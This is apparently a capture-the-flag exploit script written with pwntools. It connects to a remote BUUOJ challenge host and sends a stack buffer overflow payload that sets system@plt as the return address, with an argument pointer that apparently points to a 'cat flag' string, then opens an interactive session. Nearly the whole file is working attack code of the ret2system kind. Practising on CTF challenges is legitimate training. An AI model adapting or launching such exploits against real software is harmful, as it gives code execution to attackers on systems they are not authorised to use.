from pwn import *
from LibcSearcher import *
#context.terminal=['tmux','splitw','-h']
#context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
context(os='linux', arch='i386', kernel='i386',log_level='debug')
#io=gdb.debug('./pwn')
#io=process('./pwn')
io=remote('node4.buuoj.cn',29226)

s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive

elf=ELF('./pwn')

win=0x80485BD
cat=0x080487E0
r=0x080485D0
s=elf.plt['system']
#system=0804A018
sys=0x0804A018
payload=b'a'*(0x13+4)+p32(s)+p32(win)+p32(cat)


#ru(b'cff flag go go go ...\n')
sl(payload)


ii()
